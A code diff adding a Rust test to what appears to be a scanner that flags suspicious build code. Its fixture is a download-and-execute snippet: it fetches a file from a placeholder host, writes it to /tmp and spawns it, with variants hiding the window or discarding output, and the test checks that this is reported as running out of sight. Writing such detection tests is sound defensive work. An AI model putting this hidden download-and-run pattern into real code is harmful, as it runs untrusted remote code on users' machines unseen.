@@ -376,6 +376,24 @@ fn a_response_unwrapped_is_still_the_response() {
 }
 
 #[test]
+fn a_download_run_out_of_sight_says_so() {
+    // GR-8: a payload downloaded, then run with no window or with its output sent to null
+    let body = |how: &str| {
+        format!(
+            "let b = reqwest::blocking::get(\"https://example.invalid/p\").unwrap().bytes().unwrap();\nstd::fs::write(\"/tmp/p\", &b).unwrap();\nstd::process::Command::new(\"/tmp/p\"){}.spawn().unwrap();",
+            how
+        )
+    };
+    for how in [".creation_flags(0x08000000)", ".creation_flags(0x8)", ".stdout(std::process::Stdio::null())"] {
+        let a = build_body(&body(how));
+        assert!(has(&rs(&a.build), "downloads a file and then runs it, out of sight"), "{}: {:?}", how, rs(&a.build));
+    }
+    let a = build_body(&body(""));
+    let r = rs(&a.build);
+    assert!(has(&r, "downloads a file and then runs it") && !has(&r, "out of sight"), "{:?}", r);
+}
+
+#[test]
 fn the_events_of_a_reading_are_bounded() {
     // (RR-3) a file written then run is matched against every file written: events bounded only by steps made
     // that quadratic
